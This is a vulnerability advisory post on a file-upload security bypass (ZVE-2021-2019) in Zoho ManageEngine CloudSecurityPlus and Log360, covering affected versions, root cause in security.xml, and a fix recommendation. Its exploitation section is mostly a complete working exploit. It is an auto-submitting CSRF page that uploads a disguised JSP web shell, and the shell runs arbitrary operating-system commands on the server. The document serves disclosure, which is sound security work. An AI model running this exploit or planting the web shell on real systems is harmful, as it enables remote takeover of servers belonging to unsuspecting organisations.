---
layout: post
title:  "Zoho ManageEngine CloudSecurityPlus - Remote Code Execution via Security Misconfiguration"
tag: advisory
excerpt_separator: <!--more-->

---

Zoho ManageEngine CloudSecurityPlus before Build 4117 allows execution of arbitrary code via security misconfiguration.  
<!--more-->

### **Identifiers**
 - ZVE-2021-2019

### **Affected Products & Versions**
 - CloudSecurityPlus - 4.1.1.7
 - Log360 - 5.2.2

### **Affected Instance(s)**
 - /WC/ADSPersonalize.do?mTCall=updatePersonalizeSettings

### **Advisory URL**
 - Not Available from Vendor

### **Technical details**
It was observed that, to fix the [CVE-2021-40175](https://sahildhar.github.io/blogpost/Zoho-ManageEngine-Log360-RCE-via-Arbitrary-File-Upload/) issue, the security configurations gets applied to url paths only but not on the struts action of the affected endpoint. This allows an attacker to bypass the mitigations applied for [CVE-2021-40175](https://sahildhar.github.io/blogpost/Zoho-ManageEngine-Log360-RCE-via-Arbitrary-File-Upload/) issue, there by executing arbitrary code by uploading malicious files.


### **Impact**:
The impact in this case is 1-click RCE, as the affected endpoints reqiured for exploitation lacks CSRF protection as well.


### **Root Cause Analysis**:

In the following code-snippets from `security.xml` file, observe that the application applies custom security configuration via URL paths.

  ```xml
  <url path="/RestAPI/WC/ADSPersonalize" duration="1" threshold="10" lock-period="1" method="get,post" dynamic-params="true" csrf="true">
    <file name="LOGO_PATH" content-type-name="image" max-size="5000" allowed-extensions="gif,jpeg,jpg,png,bmp">
        <filename regex="customFileNameFilter" max-len="255" />
    </file>
    <file name="FAVICON_PATH" content-type-name="image" max-size="5000" allowed-extensions="ico">
        <filename regex="customFileNameFilter" max-len="255" />
    </file>
    <param name="BROWSER_TITLE" type="String" max-len="-1" />
  </url>
```

The above configuration can bypassed by accessing the struts action route directly.

### **Exploitation**:
Following POC exploit code when executed will write a jsp file under `http://<endpoint_ip>/images/adsf/common/logos/` folder.

```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http:\/\/log360server\/WC\/ADSPersonalize.do?mTCall=updatePersonalizeSettings", true);
        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,*\/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------14802732823662");
        xhr.withCredentials = true;
        var body = "-----------------------------14802732823662\r\n" + 
          "Content-Disposition: form-data; name=\"LOGO_PATH\"; filename=\"shell.jpg.jsp\"\r\n" + 
          "Content-Type: image/jpeg\r\n" + 
          "\r\n" + 
          "\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x01,\x01,\x00\x00\xff\xe1\x00fExif\x00\x00MM\x00*\x00\x00\x00\x08\x00\x04\x01\x1a\x00\x05\x00\x00\x00\x01\x00\x00\x00\x3e\x01\x1b\x00\x05\x00\x00\x00\x01\x00\x00\x00F\x01(\x00\x03\x00\x00\x00\x01\x00\x02\x00\x00\x011\x00\x02\x00\x00\x00\x10\x00\x00\x00N\x00\x00\x00\x00\x00\x00\x01,\x00\x00\x00\x01\x00\x00\x01,\x00\x00\x00\x01paint.ne\x84\xff\x00\xf0\xc3\xdf\xf0\x8f\x7f\xc2\xcf\xf8\x0f\xf1\x7f\xe1\xe7\xf6\xff\x00\xfc4\xb7\xf6\xb7\xf6\x1f\xfc&\xbf\x0f\xbcC\xe1\xaf\xed\x8f\xec\xaf\xf8P\x1ag\xf6\x9f\xf6g\xf6\x9f\xdb\x7f\xb3\xff\x00\xb4\xb4\xff\x00\xb6y\x1ff\xfbm\xa7\x99\xe7\xc6P\x07\xff\xd9\r\n" + 
          "\x3c%@ page import=\"java.util.*,java.io.*\"%\x3e\r\n" + 
          "\x3c%\r\n" + 
          "%\x3e\r\n" + 
          "\x3cHTML\x3e\x3cBODY\x3e\r\n" + 
          "Commands with JSP\r\n" + 
          "\x3cFORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"\x3e\r\n" + 
          "\x3cINPUT TYPE=\"text\" NAME=\"cmd\"\x3e\r\n" + 
          "\x3cINPUT TYPE=\"submit\" VALUE=\"Send\"\x3e\r\n" + 
          "\x3c/FORM\x3e\r\n" + 
          "\x3cpre\x3e\r\n" + 
          "\x3c%\r\n" + 
          "if (request.getParameter(\"cmd\") != null) {\r\n" + 
          "    out.println(\"Command: \" + request.getParameter(\"cmd\") + \"\x3cBR\x3e\");\r\n" + 
          "    Process p;\r\n" + 
          "    if ( System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1){\r\n" + 
          "        p = Runtime.getRuntime().exec(\"cmd.exe /C \" + request.getParameter(\"cmd\"));\r\n" + 
          "    }\r\n" + 
          "    else{\r\n" + 
          "        p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));\r\n" + 
          "    }\r\n" + 
          "    OutputStream os = p.getOutputStream();\r\n" + 
          "    InputStream in = p.getInputStream();\r\n" + 
          "    DataInputStream dis = new DataInputStream(in);\r\n" + 
          "    String disr = dis.readLine();\r\n" + 
          "    while ( disr != null ) {\r\n" + 
          "    out.println(disr);\r\n" + 
          "    disr = dis.readLine();\r\n" + 
          "    }\r\n" + 
          "}\r\n" + 
          "%\x3e\r\n" + 
          "\x3c/pre\x3e\r\n" + 
          "\x3c/BODY\x3e\x3c/HTML\x3e\r\n" + 
          "-----------------------------14802732823662\r\n" + 
          "Content-Disposition: form-data; name=\"BROWSER_TITLE\"\r\n" + 
          "\r\n" + 
          "ManageEngine Log360\r\n" + 
          "-----------------------------14802732823662\r\n" + 
          "Content-Disposition: form-data; name=\"FAVICON_PATH\"; filename=\"\"\r\n" + 
          "Content-Type: application/octet-stream\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------14802732823662\r\n" + 
          "Content-Disposition: form-data; name=\"ENABLE_FORGOT_PWD\"\r\n" + 
          "\r\n" + 
          "true\r\n" + 
          "-----------------------------14802732823662\r\n" + 
          "Content-Disposition: form-data; name=\"SELECT_LANGUAGE\"\r\n" + 
          "\r\n" + 
          "1\r\n" + 
          "-----------------------------14802732823662\r\n" + 
          "Content-Disposition: form-data; name=\"TIME_ZONE\"\r\n" + 
          "\r\n" + 
          "Asia/Muscat\r\n" + 
          "-----------------------------14802732823662\r\n" + 
          "Content-Disposition: form-data; name=\"DATE_TIME_FORMAT\"\r\n" + 
          "\r\n" + 
          "yyyy/MM/dd HH:mm:ss\r\n" + 
          "-----------------------------14802732823662\r\n" + 
          "Content-Disposition: form-data; name=\"THEME_COLOR\"\r\n" + 
          "\r\n" + 
          "green\r\n" + 
          "-----------------------------14802732823662--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
      submitRequest();
    </script>
  </body>
</html>
```

In the following screenshot, observe that the application executes the jsp code on the server.
![](/assets/images/ZVE-2021-2019/1.png)

### **Recommendation**:
Enforce the security configuration for the affected endpoint.